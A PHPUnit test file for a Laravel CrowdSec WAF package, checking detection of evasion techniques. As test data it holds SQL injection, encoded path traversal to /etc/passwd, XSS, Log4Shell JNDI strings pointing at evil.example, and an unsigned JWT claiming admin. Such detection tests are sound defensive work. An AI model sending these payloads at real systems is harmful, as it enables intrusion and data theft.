<?php

namespace RiloArbabillah\LaravelCrowdSec\Tests\Feature;

use Illuminate\Http\Request;
use RiloArbabillah\LaravelCrowdSec\Http\Middleware\CrowdSecProtection;
use RiloArbabillah\LaravelCrowdSec\Models\BlockedIp;
use RiloArbabillah\LaravelCrowdSec\Services\CrowdSecService;
use RiloArbabillah\LaravelCrowdSec\Services\SecurityEventContextService;
use RiloArbabillah\LaravelCrowdSec\Services\WafPolicy;
use RiloArbabillah\LaravelCrowdSec\Tests\PackageTestCase;
use Symfony\Component\HttpFoundation\Response;

class WafEvasionTest extends PackageTestCase
{
    protected function defineEnvironment($app): void
    {
        parent::defineEnvironment($app);
        $app['config']->set('crowdsec-scenarios.enabled', true);
    }

    protected function setUp(): void
    {
        parent::setUp();
        $this->loadMigrationsFrom(__DIR__ . '/../../src/Database/Migrations');
    }

    protected function service(): CrowdSecService
    {
        return new CrowdSecService($this->app->make(SecurityEventContextService::class));
    }

    /**
     * @return list<string>
     */
    protected function threatTypes(Request $request): array
    {
        return array_values(array_unique(array_column($this->service()->checkWafPatterns($request), 'type')));
    }

    protected function queryRequest(string $rawQuery): Request
    {
        return Request::create('/search?' . $rawQuery, 'GET', [], [], [], ['HTTP_USER_AGENT' => 'Mozilla/5.0']);
    }

    // =========================================================================
    // Decoding and normalization
    // =========================================================================

    public function test_detects_sql_comment_obfuscation(): void
    {
        $this->assertContains('sql_injection', $this->threatTypes($this->queryRequest('q=1%20UNION/**/SELECT%20password')));
    }

    public function test_detects_triple_url_encoding(): void
    {
        // %25252f → %252f → %2f → /  ;  ../../etc/passwd
        $this->assertContains(
            'path_traversal',
            $this->threatTypes($this->queryRequest('file=..%25252f..%25252f..%25252fetc%25252fpasswd')),
        );
    }

    public function test_detects_percent_u_encoding(): void
    {
        $this->assertContains('xss', $this->threatTypes($this->queryRequest('q=%u003cscript%u003ealert(1)%u003c/script%u003e')));
    }

    public function test_detects_url_encoded_html_entities(): void
    {
        $this->assertContains('xss', $this->threatTypes($this->queryRequest('q=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B/script%26gt%3B')));
    }

    public function test_detects_nul_byte_splitting(): void
    {
        $this->assertContains('sql_injection', $this->threatTypes($this->queryRequest('q=1%20UNI%00ON%20SELECT%20password')));
    }

    public function test_detects_fullwidth_characters(): void
    {
        if (! class_exists(\Normalizer::class)) {
            $this->markTestSkipped('intl extension not available');
        }

        // Fullwidth ＜script＞ normalizes (NFKC) to <script>
        $this->assertContains('xss', $this->threatTypes($this->queryRequest('q=' . rawurlencode('＜script＞alert(1)＜/script＞'))));
    }

    public function test_plain_text_with_comment_markers_is_not_flagged(): void
    {
        $this->assertSame([], $this->threatTypes($this->queryRequest('q=' . rawurlencode('see /* note */ below, union of sets'))));
    }

    // =========================================================================
    // Body inspection
    // =========================================================================

    public function test_detects_payload_nested_past_old_depth_limit(): void
    {
        $payload = ['q' => "1' UNION SELECT password FROM users--"];
        for ($i = 0; $i < 15; $i++) {
            $payload = ['level' . $i => $payload];
        }

        $request = Request::create('/api/data', 'POST', [], [], [], ['CONTENT_TYPE' => 'application/json'], json_encode($payload));

        $this->assertContains('sql_injection', $this->threatTypes($request));
    }

    public function test_detects_payload_nested_past_depth_cap(): void
    {
        $payload = ['q' => "1' UNION SELECT password FROM users--"];
        for ($i = 0; $i < 40; $i++) {
            $payload = ['l' . $i => $payload];
        }

        $request = Request::create('/api/data', 'POST', [], [], [], ['CONTENT_TYPE' => 'application/json'], json_encode($payload));

        $this->assertContains('sql_injection', $this->threatTypes($request));
    }

    public function test_chunked_request_without_content_length_is_size_checked(): void
    {
        config(['crowdsec-scenarios.max_content_length' => 100]);

        $request = Request::create('/upload', 'POST', [], [], [], [], str_repeat('a', 200));
        $request->headers->remove('Content-Length');

        $this->assertTrue($this->service()->isOversizedRequest($request));
    }

    // =========================================================================
    // Headers / Log4Shell
    // =========================================================================

    public function test_detects_jndi_lookup_in_custom_header(): void
    {
        $request = Request::create('/', 'GET', [], [], [], [
            'HTTP_USER_AGENT' => 'Mozilla/5.0',
            'HTTP_X_API_VERSION' => '${jndi:ldap://evil.example/a}',
        ]);

        $this->assertContains('jndi_injection', $this->threatTypes($request));
    }

    public function test_detects_obfuscated_jndi_in_user_agent(): void
    {
        $request = Request::create('/', 'GET', [], [], [], [
            'HTTP_USER_AGENT' => '${${lower:j}ndi:ldap://evil.example/a}',
        ]);

        $this->assertContains('jndi_injection', $this->threatTypes($request));
    }

    public function test_ordinary_headers_are_not_flagged(): void
    {
        $request = Request::create('/', 'GET', [], [], [], [
            'HTTP_USER_AGENT' => 'Mozilla/5.0',
            'HTTP_ORIGIN' => 'http://localhost:3000',
            'HTTP_HOST' => '127.0.0.1:8000',
            'HTTP_X_FORWARDED_FOR' => '10.0.0.1, 192.168.1.1',
            'HTTP_X_REQUESTED_WITH' => 'XMLHttpRequest',
            'HTTP_X_LIVEWIRE' => 'true',
        ]);

        $this->assertSame([], $this->threatTypes($request));
    }

    // =========================================================================
    // Modes and durations
    // =========================================================================

    public function test_jwt_privilege_escalation_defaults_to_monitor(): void
    {
        $request = $this->jwtRequest(['sub' => '1', 'role' => 'admin']);
        $threat = collect($this->service()->checkWafPatterns($request))->firstWhere('type', 'jwt_privilege_escalation');

        $this->assertSame(WafPolicy::MODE_MONITOR, $threat['mode'] ?? null);
    }

    public function test_jwt_privilege_escalation_can_be_enforced(): void
    {
        config(['crowdsec-scenarios.waf.scenario_modes' => ['jwt_privilege_escalation' => 'enforce']]);

        $request = $this->jwtRequest(['sub' => '1', 'role' => 'admin']);
        $threat = collect($this->service()->checkWafPatterns($request))->firstWhere('type', 'jwt_privilege_escalation');

        $this->assertSame(WafPolicy::MODE_ENFORCE, $threat['mode'] ?? null);
    }

    public function test_jwt_payload_threat_follows_base_scenario_mode(): void
    {
        config(['crowdsec-scenarios.waf.scenario_modes' => ['sql_injection' => 'monitor']]);

        $request = $this->jwtRequest(['sub' => "1' UNION SELECT password FROM users--"]);
        $threat = collect($this->service()->checkWafPatterns($request))->firstWhere('type', 'jwt_payload_sql_injection');

        $this->assertSame(WafPolicy::MODE_MONITOR, $threat['mode'] ?? null);
    }

    public function test_block_duration_uses_scenario_config(): void
    {
        $service = $this->service();

        $this->assertSame(360, $service->blockDurationForThreats([['type' => 'directory_bruteforce']]));
        $this->assertSame(1440, $service->blockDurationForThreats([['type' => 'directory_bruteforce'], ['type' => 'sql_injection']]));
        $this->assertSame(1440, $service->blockDurationForThreats([['type' => 'jwt_payload_sql_injection']]));
        $this->assertNull($service->blockDurationForThreats([['type' => 'unknown_type']]));
    }

    public function test_middleware_blocks_for_scenario_duration(): void
    {
        $this->freezeSecond();
        $request = Request::create('/.git/config', 'GET', [], [], [], [
            'REMOTE_ADDR' => '10.7.7.7',
            'HTTP_USER_AGENT' => 'Mozilla/5.0',
        ]);

        $response = (new CrowdSecProtection($this->service()))->handle($request, fn () => new Response('OK'));

        $this->assertSame(403, $response->getStatusCode());
        $block = BlockedIp::where('ip', '10.7.7.7')->firstOrFail();
        $this->assertSame(now()->addMinutes(360)->getTimestamp(), $block->expires_at?->getTimestamp());
    }

    /**
     * @param array<string, mixed> $claims
     */
    protected function jwtRequest(array $claims): Request
    {
        $header = rtrim(strtr(base64_encode((string) json_encode(['alg' => 'none'])), '+/', '-_'), '=');
        $payload = rtrim(strtr(base64_encode((string) json_encode($claims)), '+/', '-_'), '=');

        $request = Request::create('/api/resource', 'GET', [], [], [], ['HTTP_USER_AGENT' => 'Mozilla/5.0']);
        $request->headers->set('Authorization', "Bearer {$header}.{$payload}.sig");

        return $request;
    }
}
